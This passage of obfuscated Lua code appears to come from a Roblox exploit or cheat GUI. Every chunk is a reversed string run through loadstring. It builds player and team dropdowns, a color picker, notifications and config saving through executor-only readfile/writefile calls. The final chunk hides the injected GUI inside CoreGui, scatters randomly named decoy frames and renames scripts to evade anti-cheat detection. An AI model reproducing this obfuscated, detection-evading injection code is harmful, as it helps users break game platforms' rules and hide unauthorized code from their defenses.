)"egami"(dlihCtsriFdniF:nottuBnoitpo = egamInoitpo lacol			
)"txet"(dlihCtsriFdniF:nottuBnoitpo = txeTnoitpo lacol			
01 = xednIZ.nottuBnoitpo			
eurt = elbisiV.nottuBnoitpo			
i ro redro.meti = redrOtuoyaL.nottuBnoitpo			
)thgieHnottub ,0 ,0 ,1(wen.2miDU = eziS.nottuBnoitpo			
i .. "_noitpO" = emaN.nottuBnoitpo			
)(enolC:etalpmeTnottub = nottuBnoitpo lacol			
od )tsiLmeti(sriapi ni meti ,i rof		
)thgieHlatot ,0 ,0 ,0(wen.2miDU = eziSsavnaC.gnillorcSnwodpord		
)thgieHelbisiv ,0 ,0 ,1(wen.2miDU = eziS.gnillorcSnwodpord		
thgieHnottub * tnuoCelbisiv = thgieHelbisiv lacol		
thgieHnottub * tsiLmeti# = thgieHlatot lacol		
Y.eziSetulosbA.emarFnwodpord = thgieHnottub lacol		
tsiLmeti# ro )elbisiVxam ,tsiLmeti#(nim.htam dna elbisiVxam = tnuoCelbisiv lacol		
dne		
dne			
dne				
)}					
i = redro						
,meti = yalpsid						
,meti = eulav						
{ ,tsiLmeti(tresni.elbat					
neht )eurt ,1 ,)(rewol:retlif(dnif:)(rewol:meti ro "" == retlif fi				
od )tsiLmotsuc(sriapi ni meti ,i rof			
esle		
dne			
dne				
)}					
eurt = maeTsi						
,emaNmaet = yalpsid						
,emaNmaet = eulav						
{ ,tsiLmeti(tresni.elbat					
neht )eurt ,1 ,)(rewol:retlif(dnif:)(rewol:emaNmaet ro "" == retlif fi				
emaN.maet = emaNmaet lacol				
od ))(smaeTteG:smaeT(sriap ni maet ,_ rof			
neht "smaet" == epyTnwodpord fiesle		
dne			
dne				
)}					
eurt = reyalPsi						
,dIresU.reyalp = dIresu						
,emaNyalpsid = yalpsid						
,emaN.reyalp = eulav						
{ ,tsiLmeti(tresni.elbat					
neht )eurt ,1 ,)(rewol:retlif(dnif:)(rewol:emaNyalpsid ro "" == retlif fi				
emaN.reyalp ro emaNyalpsiD.reyalp dna semaNyalpsiDwohs = emaNyalpsid lacol				
dne				
eunitnoc					
neht )dIresU.reyalPlacoL.sreyalP(htiWsdneirFsI:reyalp ton dna ylnOsdneirFwohs fi				
od ))(sreyalPteG:sreyalP(sriap ni reyalp ,_ rof			
neht "sreyalp" == epyTnwodpord fi		
}{ = tsiLmeti lacol		
dne		
dne			
)(yortseD:dlihc				
neht )"_noitpO^"(hctam:emaN.dlihc fi			
od ))(nerdlihCteG:gnillorcSnwodpord(sriap ni dlihc ,_ rof		
)retlif(tsiLdliub noitcnuf lacol	
dne	
)tesffO.Y.eziS.tsiLnwodpord ,0 ,X.eziSsba ,0(wen.2miDU = eziS.tsiLnwodpord		
)Y.eziSsba + Y.soPsba ,0 ,X.soPsba ,0(wen.2miDU = noitisoP.tsiLnwodpord		
eziSetulosbA.emarFnwodpord = eziSsba lacol		
noitisoPetulosbA.emarFnwodpord = soPsba lacol		
)(noitisoPnwodporDetadpu noitcnuf lacol	
dne	
dne		
dne			
dne				
txeTlanigiro = txeT.txet					
esle				
"--" = txeT.txet					
neht "enon" == noitceleStluafed fi				
esle			
elgniSdetceles = txeT.txet				
neht elgniSdetceles fi			
esle		
dne			
)(yortseD:lebaLtset				
dne				
)"detceleS " ro "detceleS sreyalP " dna "sreyalp" == epyTnwodpord( .. tnuoc = txeT.txet					
esle				
denibmoc = txeT.txet					
neht stiFtxeT.lebaLtset fi				
tneraP.txet = tneraP.lebaLtset				
denibmoc = txeT.lebaLtset				
)(enolC:txet = lebaLtset lacol				
)" ," ,seman(tacnoc.elbat = denibmoc lacol				
esle			
dne				
txeTlanigiro = txeT.txet					
esle				
"--" = txeT.txet					
neht "enon" == noitceleStluafed fi				
neht 0 == tnuoc fi			
dne			
)meti ,seman(tresni.elbat				
1 + tnuoc = tnuoc				
od )smetIdetceles(sriap ni _ ,meti rof			
}{ = seman lacol			
0 = tnuoc lacol			
neht tceleSitlum fi		
)(txeTetadpu noitcnuf lacol	
dne	
dne		
)(gifnoCevas			
noitceleStluafed = ]yeKgifnoc[ataDgifnoC.G_			
noitceleStluafed = elgniSdetceles			
neht tceleSitlum ton dna "motsuc" == epyTnwodpord fiesle		
"--" = txeT.txet			
lin = elgniSdetceles			
neht "enon" == noitceleStluafed fi		
neht noitceleStluafed fiesle	
dne		
]yeKgifnoc[ataDgifnoC.G_ = elgniSdetceles			
esle		
]yeKgifnoc[ataDgifnoC.G_ = smetIdetceles			
neht tceleSitlum fi		
neht ]yeKgifnoc[ataDgifnoC.G_ fi	
emaNemarf = yeKgifnoc lacol	
eslaf = ylnOsdneirFwohs lacol	
eslaf = semaNyalpsiDwohs lacol	
txeT.txet = txeTlanigiro lacol	
lin = elgniSdetceles lacol	
}{ = smetIdetceles lacol	
eslaf = nepOsi lacol	
dne	
gnillorcSnwodpord = tneraP.tuoyaLtsiLiu		
redrOtuoyaL.redrOtroS.munE = redrOtroS.tuoyaLtsiLiu		
)"tuoyaLtsiLIU"(wen.ecnatsnI = tuoyaLtsiLiu		
neht tuoyaLtsiLiu ton fi	
)"tuoyaLtsiLIU"(dlihCtsriFdniF:gnillorcSnwodpord = tuoyaLtsiLiu lacol	
)"sdneirf"(dlihCtsriFdniF:sresUnwodpord dna sresUnwodpord = ntBsdneirf lacol	
)"yalpsid"(dlihCtsriFdniF:sresUnwodpord dna sresUnwodpord = ntByalpsid lacol	
)"sresUnwodpord"(dlihCtsriFdniF:tsiLnwodpord = sresUnwodpord lacol	
)"llatcelesnu"(dlihCtsriFdniF:llAtceleSnwodpord dna llAtceleSnwodpord = ntBllAtcelesnu lacol	
)"llatceles"(dlihCtsriFdniF:llAtceleSnwodpord dna llAtceleSnwodpord = ntBllAtceles lacol	
)"llAtceleSnwodpord"(dlihCtsriFdniF:tsiLnwodpord = llAtceleSnwodpord lacol	
dne nruter neht etalpmeTnottub ton fi	
)"nottub"(dlihCtsriFdniF:gnillorcSnwodpord = etalpmeTnottub lacol	
dne nruter neht )"emarFgnillorcS"(AsI:gnillorcSnwodpord ton ro gnillorcSnwodpord ton fi	
)"gnillorcSnwodpord"(dlihCtsriFdniF:tsiLnwodpord = gnillorcSnwodpord lacol	
dne nruter neht tsiLnwodpord ton fi	
)"nwodporD"(dlihCtsriFdniF:iuGneercs = tsiLnwodpord lacol	
dne nruter neht txet ton ro worra ton ro hcraes ton ro emarFnwodpord ton fi	
)eurt ,"ekortSeniltuo"(dlihCtsriFdniF:emarFnwodpord dna emarFnwodpord = ekortSeniltuo lacol	
)"txet"(dlihCtsriFdniF:nottub = txet lacol	
)"worra"(dlihCtsriFdniF:nottub = worra lacol	
)"hcraes"(dlihCtsriFdniF:nottub = hcraes lacol	
)"emarFnwodpord"(dlihCtsriFdniF:nottub = emarFnwodpord lacol	
dne nruter neht nottub ton fi	
)"nottub"(dlihCtsriFdniF:emarf = nottub lacol	
dne nruter neht emarf ton fi	
)emaNemarf(dlihCtsriFdniF:tneraP.tpircSxobpuorg = emarf lacol	
eslaf ro snottubresuwohs.gifnoc = snottuBresUwohs lacol	
eslaf ro llatceleswohs.gifnoc = llAtceleSwohs lacol	
noitcelestluafed.gifnoc = noitceleStluafed lacol	
eslaf ro nocireyalp.gifnoc = nocIreyalp lacol	
eslaf ro rabhcraes.gifnoc = rabhcraeSsah lacol	
xam.gifnoc = elbisiVxam lacol	
tcelesitlumxam.gifnoc = tceleSitluMxam lacol	
eslaf ro tcelesitlum.gifnoc = tceleSitlum lacol	
}{ ro tsilmotsuc.gifnoc = tsiLmotsuc lacol	
"motsuc" ro epytnwodpord.gifnoc = epyTnwodpord lacol	
kcabllac.gifnoc = kcabllac lacol	
pitloot.gifnoc = txeTpitloot lacol	
xobpuorg.gifnoc = tpircSxobpuorg lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(nwodporDetaerC noitcnuf lacol
lin = nwodporDnepOtnerruc lacol
dne
tluser nruter	
tluser = ]dIresu[sbmuhTdehcac	
"" ro gmi dna ko = tluser lacol	
)dne	
)84x84eziS.eziSlianbmuhT.munE ,tohSdaeH.epyTlianbmuhT.munE ,dIresu(cnysAlianbmuhTresUteG:sreyalP nruter		
)(noitcnuf(llacp = gmi ,ko lacol	
dne ]dIresu[sbmuhTdehcac nruter neht ]dIresu[sbmuhTdehcac fi	
)dIresu(bmuhTteg noitcnuf lacol
}{ = sbmuhTdehcac lacol
)(gifnoCdaol
dne
dne	
)atad(edoceDNOSJ:ecivreSpttH = ataDgifnoC.G_		
neht atad dna sseccus fi	
)dne	
)ELIF_GIFNOC(elifdaer nruter		
)(noitcnuf(llacp = atad ,sseccus lacol	
)(gifnoCdaol noitcnuf lacol
dne
)dne	
))ataDgifnoC.G_(edocnENOSJ:ecivreSpttH ,ELIF_GIFNOC(elifetirw		
)(noitcnuf(llacp	
)(gifnoCevas noitcnuf lacol
"nosj.gifnocym" = ELIF_GIFNOC lacol
}{ ro ataDgifnoC.G_ = ataDgifnoC.G_

)sroloCllAetadpu(tcennoC:)"3roloCdnuorgkcaB"(langiSdegnahCytreporPteG:emarFroloc

dne
3roloCdnuorgkcaB.emarFroloc = roloCtegrat	
)(sroloCllAetadpu noitcnuf lacol

3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol
dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol
)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol
)"smaeT"(ecivreSteG:emag = smaeT lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol
dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol
dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol]]):reverse())();
end;
task.spawn(C_3f6);
local function C_3f7()
local script = _llza[_sc(51,102,55)];
loadstring(([[)dne
lin = nottuBrekciPevitca	
eslaf = elbisiV.rekciProloCniam	

dne nruter neht nottuBrekciPevitca ton fi	
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottuBlecnac
lecnac.lecnacylppa.tuoyalemarfrenni.rekciProloCniam = nottuBlecnac lacol


)dne
dne	
lin = nottuBrekciPevitca		
eslaf = elbisiV.rekciProloCniam		

dne		
)ahplAdetceles ,roloCdetceles(kcabllaCevitca			
neht kcabllaCevitca fi		

dne		
)(gifnoCevas			
}			
ahplAdetceles = a				
,)552 * B.roloCdetceles(roolf.htam = b				
,)552 * G.roloCdetceles(roolf.htam = g				
,)552 * R.roloCdetceles(roolf.htam = r				
{ = ]yeKgifnoCevitca[ataDgifnoC.G_			
neht yeKgifnoCevitca fi		

dne		
roloCdetceles = roloC.ekortSnottuBevitca			
neht ekortSnottuBevitca fi		
dne		
0 = ycnerapsnarTdnuorgkcaB.emarFroloCnottuBevitca			
roloCdetceles = 3roloCdnuorgkcaB.emarFroloCnottuBevitca			
neht emarFroloCnottuBevitca fi		

)(roloCrekciProloCteG.G_ = ahplAdetceles ,roloCdetceles lacol		
neht roloCrekciProloCteG.G_ fi	

dne nruter neht nottuBrekciPevitca ton fi	
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottuBylppa
ylppa.lecnacylppa.tuoyalemarfrenni.rekciProloCniam = nottuBylppa lacol


rekciProloCetaerC = rekciProloCetaerC.G_

dne
dne	
)dne		
dne			
)(pitlooTediH.G_				
neht pitlooTediH.G_ fi			
)(noitcnuf(tcennoC:evaeLesuoM.nottuBrekcip		
)dne		
dne			
)txeTpitloot(pitlooTwohS.G_				
dne				
)elacs / )21 + Y.tesnIiug - Y.soPesuom( ,0 ,elacs / )21 + X.tesnIiug - X.soPesuom( ,0(wen.2miDU = noitisoP.pitloot					
neht pitloot fi				
)"pitlooT"(dlihCtsriFdniF:iuGneercs = pitloot lacol				
1 ro elacS.elacSiu dna elacSiu = elacs lacol				
)"elacSIU"(ssalCfOdlihCtsriFdniF:iuGneercs = elacSiu lacol				
)(tesnIiuGteG:)"ecivreSiuG"(ecivreSteG:emag = tesnIiug lacol				
)(noitacoLesuoMteG:ecivreStupnIresU = soPesuom lacol				
neht pitlooTwohS.G_ fi			
)(noitcnuf(tcennoC:retnEesuoM.nottuBrekcip		
neht txeTpitloot fi	
	

)dne	
dne		
dne			
)ahplAtluafed ,3roloCdnuorgkcaB.emarFroloCnottub(roloCrekciProloCteS.G_				
neht roloCrekciProloCteS.G_ fi			
			

)dne			
dne				
dne					
lin = noitcennoCetadpu						
)(tcennocsiD:noitcennoCetadpu						
neht noitcennoCetadpu fi					
esle				
)(rekciPnoitisop					
neht nottuBrekcip == nottuBrekciPevitca dna elbisiV.rekciProloCniam fi				
)(noitcnuf(tcennoC:deppetSredneR.ecivreSnuR = noitcennoCetadpu			
dne			
)(tcennocsiD:noitcennoCetadpu				
neht noitcennoCetadpu fi			
			

dne			
dne				
)252 ,0 ,002 ,0(wen.2miDU = eziS.rekciProloCniam					
esle				
)072 ,0 ,002 ,0(wen.2miDU = eziS.rekciProloCniam					
neht delbanEahpla fi				
delbanEahpla = elbisiV.emarFycnerapsnart				
neht emarFycnerapsnart fi			
)"ycnerapsnart"(dlihCtsriFdniF:tuoyalemarfrenni.rekciProloCniam = emarFycnerapsnart lacol			
			

dne			
dne				
txeTeltit = txeT.lebaLeltit					
neht lebaLeltit fi				
)"txet"(dlihCtsriFdniF:tuoyalemarfrenni.rekciProloCniam = lebaLeltit lacol				
neht txeTeltit fi			
			

ekortSnottub = ekortSnottuBevitca			
emarFroloCnottub = emarFroloCnottuBevitca			
kcabllac = kcabllaCevitca			
yeKgifnoc = yeKgifnoCevitca			
			

nottuBrekcip = nottuBrekciPevitca			
eurt = elbisiV.rekciProloCniam			
)(rekciPnoitisop			
			
esle		
dne			
lin = noitcennoCetadpu				
)(tcennocsiD:noitcennoCetadpu				
neht noitcennoCetadpu fi			
lin = nottuBrekciPevitca			
eslaf = elbisiV.rekciProloCniam			
			
neht nottuBrekcip == nottuBrekciPevitca dna elbisiV.rekciProloCniam fi		
)(noitcnuf(tcennoC:kcilC1nottuBesuoM.nottuBrekcip	

lin = noitcennoCetadpu lacol	
)"ecivreSnuR"(ecivreSteG:emag = ecivreSnuR lacol	
	

dne	
dne		
dne			
)Y.eziSnottub + Y.soPnottub ,0 ,X.soPnottub ,0(wen.2miDU = noitisoP.rekciProloCniam				
esle			
)Y.eziSnottub + Y.soPnottub ,0 ,X.eziSrekcip - X.eziSnottub + X.soPnottub ,0(wen.2miDU = noitisoP.rekciProloCniam				
neht edisthgiRsi fi			

eziSetulosbA.rekciProloCniam = eziSrekcip lacol			
eziSetulosbA.nottuBrekcip = eziSnottub lacol			
noitisoPetulosbA.nottuBrekcip = soPnottub lacol			
)"thgir"(dnif:)(rewol:emaN.emarFxobpuorg = edisthgiRsi lacol			
			
esle		
)2 / )Y.eziSrekcip - Y.eziSneercs( ,0 ,2 / )X.eziSrekcip - X.eziSneercs( ,0(wen.2miDU = noitisoP.rekciProloCniam			
eziSetulosbA.rekciProloCniam = eziSrekcip lacol			
eziSetulosbA.iuGneercs = eziSneercs lacol			
			
neht rekciProloCretneC.G_ fi		
)(rekciPnoitisop noitcnuf lacol	
	

dne	
delbanEahpla = elbisiV.emarFycnerapsnart		
neht emarFycnerapsnart fi	
)"ycnerapsnart"(dlihCtsriFdniF:tuoyalemarfrenni.rekciProloCniam = emarFycnerapsnart lacol	
	

dne	
dne		
txeTeltit = txeT.lebaLeltit			
neht lebaLeltit fi		
)"txet"(dlihCtsriFdniF:tuoyalemarfrenni.rekciProloCniam = lebaLeltit lacol		
neht txeTeltit fi	
	

dne	
roloCtrats = roloC.ekortSnottub		
neht ekortSnottub fi	
roloCtrats = 3roloCdnuorgkcaB.emarFroloCnottub	
	

dne	
ahplAtluafed ro a.devas = ahplAtluafed		
)b.devas ,g.devas ,r.devas(BGRmorf.3roloC = roloCtrats		
]yeKgifnoc[ataDgifnoC.G_ = devas lacol		
neht ]yeKgifnoc[ataDgifnoC.G_ fi	
	

emaNemarFrekciProloc .. "_" .. emaNemarf = yeKgifnoc lacol	
	

dne	
roloCtluafed = roloCtrats		
neht "3roloC" == )roloCtluafed(foepyt fiesle	
dne		
))b(rebmunot ,)g(rebmunot ,)r(rebmunot(BGRmorf.3roloC = roloCtrats			
neht b dna g dna r fi		
)")+d%(*s%,)+d%(*s%,)+d%("(hctam:roloCtluafed = b ,g ,r lacol		
neht "gnirts" == )roloCtluafed(epyt fiesle	
roloCtegrat = roloCtrats		
neht "roloCemarf" == roloCtluafed fi	
)552 ,552 ,552(BGRmorf.3roloC = roloCtrats lacol	
	

)"ekortSIU"(dlihCtsriFdniF:emarFroloCnottub = ekortSnottub lacol	

dne nruter neht emarFroloCnottub ton fi	
)"emarFroloc"(dlihCtsriFdniF:nottuBrekcip = emarFroloCnottub lacol	

dne nruter neht nottuBrekcip ton fi	
)emaNemarFrekciProloc(dlihCtsriFdniF:emarf = nottuBrekcip lacol	

dne nruter neht emarf ton fi	
)emaNemarf(dlihCtsriFdniF:emarFxobpuorg = emarf lacol	
tneraP.xobpuorg.gifnoc = emarFxobpuorg lacol	

kcabllac.gifnoc = kcabllac lacol	
0 ro ahplatluafed.gifnoc = ahplAtluafed lacol	
eslaf =~ ahpla.gifnoc = delbanEahpla lacol	
eltit.gifnoc = txeTeltit lacol	
tluafed.gifnoc = roloCtluafed lacol	
pitloot.gifnoc = txeTpitloot lacol	
emarfrekciproloc.gifnoc = emaNemarFrekciProloc lacol	
emarf.gifnoc = emaNemarf lacol	
)gifnoc(rekciProloCetaerC noitcnuf lacol

lin = ekortSnottuBevitca lacol
lin = emarFroloCnottuBevitca lacol
lin = kcabllaCevitca lacol
lin = yeKgifnoCevitca lacol
lin = nottuBrekciPevitca lacol

dne nruter neht rekciProloCniam ton fi
)"rekciProloC"(dlihCtsriFdniF:iuGneercs = rekciProloCniam lacol

)(gifnoCdaol

dne
dne	
)atad(edoceDNOSJ:ecivreSpttH = ataDgifnoC.G_		
neht atad dna sseccus fi	
)dne	
)ELIF_GIFNOC(elifdaer nruter		
)(noitcnuf(llacp = atad ,sseccus lacol	
)(gifnoCdaol noitcnuf lacol

dne
)dne	
))ataDgifnoC.G_(edocnENOSJ:ecivreSpttH ,ELIF_GIFNOC(elifetirw		
)(noitcnuf(llacp	
)(gifnoCevas noitcnuf lacol

"nosj.gifnocym" = ELIF_GIFNOC lacol

}{ ro ataDgifnoC.G_ = ataDgifnoC.G_

3roloCdnuorgkcaB.emarFroloc = roloCtegrat lacol

dne nruter neht emarFroloc ton fi
)"roloC"(dlihCtsriFdniF:iuGneercs = emarFroloc lacol

)"ecivreSpttH"(ecivreSteG:emag = ecivreSpttH lacol
)"ecivreStupnIresU"(ecivreSteG:emag = ecivreStupnIresU lacol

dne nruter neht iuGneercs ton fi
)(iuGneercSteg = iuGneercs lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol]]):reverse())();
end;
task.spawn(C_3f7);
local function C_3f8()
local script = _llza[_sc(51,102,56)];
loadstring(([[dne
dne	
)dne		
)rlp ,atadm(reldnah			
)(noitcnuf(llacp		
od )sreldnaHtahC.G_(sriapi ni reldnah ,_ rof	
	

dne nruter neht rlp ton fi	

)dIresU.ecruoStxeT.atadm(dIresUyBreyalPteG:sreyalP dna		
dIresU.ecruoStxeT.atadm dna		
ecruoStxeT.atadm = rlp lacol	
)atadm(noitcnuf = egasseMgnimocnInO.ecivreStahCtxeT

}{ ro sreldnaHtahC.G_ = sreldnaHtahC.G_

)"ecivreStahCtxeT"(ecivreSteG:emag = ecivreStahCtxeT lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol]]):reverse())();
end;
task.spawn(C_3f8);
local function C_3f9()
local script = _llza[_sc(51,102,57)];
loadstring(([[dne
dne	
)(stnioJkaerB:retcarahC.reyalPlacoL		
neht retcarahC.reyalPlacoL fi	
)(noitcnuf = retcarahCteseR.derahs

reyalPlacoL.sreyalP = reyalPlacoL lacol
)"sreyalP"(ecivreSteG:emag = sreyalP lacol]]):reverse())();
end;
task.spawn(C_3f9);
local function C_3fa()
local script = _llza[_sc(51,102,97)];
loadstring(([[dne
)dIdnuos ,noitarud ,txet(yfitoN:metsySnoitacifitoN	
)dIdnuos ,noitarud ,txet(noitcnuf = yfitoN.G_

dne
)dne	
)(snoitacifitoNnoitisoper		
		

)(yortseD:fiton		

dne		
dne			
kaerb				
)i ,snoitacifitoNevitca(evomer.elbat				
neht ataDfiton == n fi			
od )snoitacifitoNevitca(sriap ni n ,i rof		
		

)2.0(tiaw.ksat		

)(yalP:)}		
0 = elacS			
{ ,)nI.noitceriDgnisaE.munE ,kcaB.elytSgnisaE.munE ,2.0(wen.ofnIneewT ,elacSiu(etaerC:ecivreSneewT		
)(noitcnuf ,noitarud(yaled.ksat	
	

)(yalP:)}	
1 = elacS		
{ ,)tuO.noitceriDgnisaE.munE ,kcaB.elytSgnisaE.munE ,6.0(wen.ofnIneewT ,elacSiu(etaerC:ecivreSneewT	
	

)(snoitacifitoNnoitisoper	
	

)ataDfiton ,snoitacifitoNevitca(tresni.elbat	
}fiton = emarf{ = ataDfiton lacol	
	

fiton = tneraP.roloCiug	
)0 ,1 ,2 ,0(wen.2miDU = eziS.roloCiug	
roloCtegraTfiton = 3roloCdnuorgkcaB.roloCiug	
0 = lexiPeziSredroB.roloCiug	
999999999 = xednIZ.roloCiug	
"roloCiuG" = emaN.roloCiug	
)"emarF"(wen.ecnatsnI = roloCiug lacol	
	

fiton = tneraP.ekortSeniltuo	
)"ekortSIU"(wen.ecnatsnI = ekortSeniltuo lacol	

fiton = tneraP.elacSiu	
0 = elacS.elacSiu	
)"elacSIU"(wen.ecnatsnI = elacSiu lacol	

lebaLtxet = tneraP.gniddap	
)2 ,0(wen.miDU = thgiRgniddaP.gniddap	
)7 ,0(wen.miDU = tfeLgniddaP.gniddap	
)"gniddaPIU"(wen.ecnatsnI = gniddap lacol	

lebaLtxet = tneraP.ekortStxet	
)"ekortSIU"(wen.ecnatsnI = ekortStxet lacol	

fiton = tneraP.lebaLtxet	
txet = txeT.lebaLtxet	
)0 ,1 ,0 ,1(wen.2miDU = eziS.lebaLtxet	
)552 ,552 ,552(BGRmorf.3roloC = 3roloCtxeT.lebaLtxet	
edoC.tnoF.munE = tnoF.lebaLtxet	
1 = ycnerapsnarTdnuorgkcaB.lebaLtxet	
retneC.tnemngilAYtxeT.munE = tnemngilAYtxeT.lebaLtxet	
tfeL.tnemngilAXtxeT.munE = tnemngilAXtxeT.lebaLtxet	
21 = eziStxeT.lebaLtxet	
0 = lexiPeziSredroB.lebaLtxet	
999999999 = xednIZ.lebaLtxet	
eurt = depparWtxeT.lebaLtxet	
"txet" = emaN.lebaLtxet	
)"lebaLtxeT"(wen.ecnatsnI = lebaLtxet lacol	
	

edaFfiton = tneraP.tneidarg	
}	
)7.0 ,000.1(wen.tniopyeKecneuqeSrebmuN		
,)1 ,000.0(wen.tniopyeKecneuqeSrebmuN		
{wen.ecneuqeSrebmuN = ycnerapsnarT.tneidarg	
09 = noitatoR.tneidarg	
)"tneidarGIU"(wen.ecnatsnI = tneidarg lacol	

fiton = tneraP.edaFfiton	
)0 ,1 ,0 ,1(wen.2miDU = eziS.edaFfiton	
)0 ,0 ,0(BGRmorf.3roloC = 3roloCdnuorgkcaB.edaFfiton	
0 = lexiPeziSredroB.edaFfiton	
"edaFfiton" = emaN.edaFfiton	
)"puorGsavnaC"(wen.ecnatsnI = edaFfiton lacol	
	

  )0 ,20.0 ,0 ,0(wen.2miDU = noitisoP.fiton	
	

iuGneercSfiton = tneraP.fiton	
)15 ,15 ,15(BGRmorf.3roloC = 3roloCredroB.fiton	
)thgieh ,0 ,htdiw ,0(wen.2miDU = eziS.fiton	
tesnI.edoMredroB.munE = edoMredroB.fiton	
)12 ,12 ,12(BGRmorf.3roloC = 3roloCdnuorgkcaB.fiton	
9000000001 = xednIZ.fiton	
"fitoN" = emaN.fiton	
)"emarF"(wen.ecnatsnI = fiton lacol	
	

)4 + Y.sdnuoBtxet ,02(xam.htam = thgieh lacol	
))htdiWxam ,41 + X.sdnuoBtxet(nim.htam ,001(xam.htam = htdiw lacol	

)	
)eguh.htam ,41 - htdiWxam(wen.2rotceV		
,edoC.tnoF.munE		
,21		
,txet		
(eziStxeTteG:ecivreStxeT = sdnuoBtxet lacol	
053 = htdiWxam lacol	
	

dne	
)dne		
)(yortseD:dnuos			
)(noitcnuf(tcennoC:dednE.dnuos		

)(yalP:dnuos		
)"ecivreSdnuoS"(ecivreSteG:emag = tneraP.dnuos		
5.0 = emuloV.dnuos		
)dIdnuos(gnirtsot .. "//:ditessaxbr" = dIdnuoS.dnuos		
)"dnuoS"(wen.ecnatsnI = dnuos lacol		
		

)(yortseD:dnuoSdaolerp		

dne		
)(tiaw.ksat			
od 5.0 < )emiTtrats - )(kcit( dna dedaol ton elihw		
)(kcit = emiTtrats lacol		
		

)dne		
eurt = dedaol			
)(noitcnuf(tcennoC:dedaoL.dnuoSdaolerp		
eslaf = dedaol lacol		

)"ecivreSdnuoS"(ecivreSteG:emag = tneraP.dnuoSdaolerp		
0 = emuloV.dnuoSdaolerp		
)dIdnuos(gnirtsot .. "//:ditessaxbr" = dIdnuoS.dnuoSdaolerp		
)"dnuoS"(wen.ecnatsnI = dnuoSdaolerp lacol		
		
neht dIdnuos fi	
	

dne	
3roloCdnuorgkcaB.emarFroloc = roloCtegraTfiton		
neht emarFroloc fi	
	

lin ro dIdnuos = dIdnuos	
5 ro noitarud = noitarud	

dne nruter neht iuGneercSfiton ton fi	
)dIdnuos ,noitarud ,txet(yfitoN:metsySnoitacifitoN noitcnuf

dne
dne	
dne		
 500.0 + tesffOthgieh + tesffOy = tesffOy			

thgieHneercs / thgieHfiton = tesffOthgieh lacol			
Y.eziSetulosbA.iuGneercSfiton = thgieHneercs lacol			
Y.eziSetulosbA.emarf.ataDfiton = thgieHfiton lacol			
			

)(yalP:)}			
  )0 ,tesffOy ,0 ,0(wen.2miDU = noitisoP				
{ ,)tuO.noitceriDgnisaE.munE ,dauQ.elytSgnisaE.munE ,2.0(wen.ofnIneewT ,emarf.ataDfiton(etaerC:ecivreSneewT			
neht tneraP.emarf.ataDfiton dna emarf.ataDfiton fi		
od )snoitacifitoNevitca(sriapi ni ataDfiton ,i rof	
  20.0 = tesffOy lacol	
)(snoitacifitoNnoitisoper noitcnuf lacol

}{ = snoitacifitoNevitca lacol

)"ecivreStxeT"(ecivreSteG:emag = ecivreStxeT lacol
)"ecivreSneewT"(ecivreSteG:emag = ecivreSneewT lacol
}{ = metsySnoitacifitoN lacol

)552 ,421 ,0(BGRmorf.3roloC ro 3roloCdnuorgkcaB.emarFroloc dna emarFroloc = roloCtegraTfiton lacol
)"roloC"(dlihCtsriFdniF:iuGneercSfiton = emarFroloc lacol


dne nruter neht iuGneercSfiton ton fi
)(fitoNroFiuGneercSteg = iuGneercSfiton lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(fitoNroFiuGneercSteg noitcnuf lacol
]]):reverse())();
end;
task.spawn(C_3fa);
local function C_3fc()
local script = _llza[_sc(51,102,99)];
loadstring(([[dne
dne	
emarFekaf = tneraP.dlihCekaf		

dne		
eurt = delbasiD.dlihCekaf			
neht )"tpircSlacoL"(AsI:dlihCekaf fi		

dne		
eslaf = elbisiV.dlihCekaf			
neht )"tcejbOiuG"(AsI:dlihCekaf fi		

))21 ,5(modnar.htam(gnirtSmodnar = emaN.dlihCekaf		
)epyTmodnar(wen.ecnatsnI = dlihCekaf lacol		
])sepyTecnatsni# ,1(modnar.htam[sepyTecnatsni = epyTmodnar lacol		
od nerdlihCmun ,1 = j rof	
)8 ,3(modnar.htam = nerdlihCmun lacol	

iuGlaeR = tneraP.emarFekaf	
eslaf = elbisiV.emarFekaf	
"emarFniaM" = emaN.emarFekaf	
)"emarF"(wen.ecnatsnI = emarFekaf lacol	
od 01 ,1 = i rof

dne
tluser nruter	
dne	
)dnar ,dnar(bus:srahc .. tluser = tluser		
)srahc# ,1(modnar.htam = dnar lacol		
od htgnel ,1 = i rof	
"" = tluser lacol	
"9876543210ZYXWVUTSRQPONMLKJIHGFEDCBA" = srahc lacol	
)htgnel(gnirtSmodnar noitcnuf lacol

}"tpircSlacoL" ,"redloF" ,"emarFgnillorcS" ,"lebaLegamI" ,"nottuBtxeT" ,"lebaLtxeT" ,"emarF"{ = sepyTecnatsni lacol




dne
dne	
"redloF" = emaN.tnadnecsed		
neht )"$EDIH"(hctam:emaN.tnadnecsed dna )"redloF"(AsI:tnadnecsed fiesle	
"tpircSlacoL" = emaN.tnadnecsed		
neht )"tpircS"(AsI:tnadnecsed ro )"tpircSeludoM"(AsI:tnadnecsed ro )"tpircSlacoL"(AsI:tnadnecsed fi	
od ))(stnadnecseDteG:iuGlaeR(sriap ni tnadnecsed ,_ rof




iuGeroC = tneraP.iuGlaeR




dne nruter neht iuGlaeR ton fi
)(iuGneercSteg = iuGlaeR lacol

dne
dne	
tneraP.p = p		
dne p nruter neht )"iuGneercS"(AsI:p fi		
od p elihw	
tneraP.tpircs = p lacol	
)(iuGneercSteg noitcnuf lacol


)"iuGreyalP"(dlihCroFtiaW:reyalPlacoL = iuGreyalP lacol
reyalPlacoL.sreyalP = reyalPlacoL lacol
)"iuGeroC"(ecivreSteG:emag = iuGeroC lacol
